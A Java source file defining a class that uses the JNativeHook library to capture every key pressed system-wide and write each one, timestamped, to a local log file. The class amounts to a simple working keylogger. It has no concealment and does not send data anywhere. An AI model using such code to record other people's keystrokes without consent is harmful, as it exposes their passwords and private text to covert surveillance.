package random;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

public class KeyListener implements NativeKeyListener {

    private static final String LOG_FORMAT = "[%1$tF %1$tT] %3$s %n";
    private static final String CONFIG_PROPERTIES = "config.properties";
    private static final String PROP_FILE_PATH = "FilePath";
    private static final String KEY_LOG = "Key Log";

    private Logger logger;

    KeyListener(String logFilePath) throws IOException {
        logger = Logger.getLogger(KEY_LOG);
        FileHandler fileHandler = new FileHandler(getLogFilePath(logFilePath));
        logger.addHandler(fileHandler);
        fileHandler.setFormatter(getCustomSimpleFormatter());
    }

    private String getLogFilePath(String logFilePath) throws IOException {
        return logFilePath.isEmpty()
                ? getLogFilePathFromPropFile()
                : logFilePath;
    }

    private String getLogFilePathFromPropFile() throws IOException {
        Properties properties = new Properties();
        try (InputStream inputStream = new FileInputStream(CONFIG_PROPERTIES)) {
            properties.load(inputStream);
        }
        return properties.getProperty(PROP_FILE_PATH);
    }

    private SimpleFormatter getCustomSimpleFormatter() {
        return new SimpleFormatter() {
            @Override
            public synchronized String format(LogRecord logRecord) {
                return String.format(LOG_FORMAT,
                        new Date(logRecord.getMillis()),
                        logRecord.getLevel().getLocalizedName(),
                        logRecord.getMessage()
                );
            }
        };
    }

    /**
     * Overridden method to capture the pressed keys.
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        logger.info(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    /**
     * Overridden method to capture released keys.
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    /**
     * Overridden method to capture the typed keys.
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
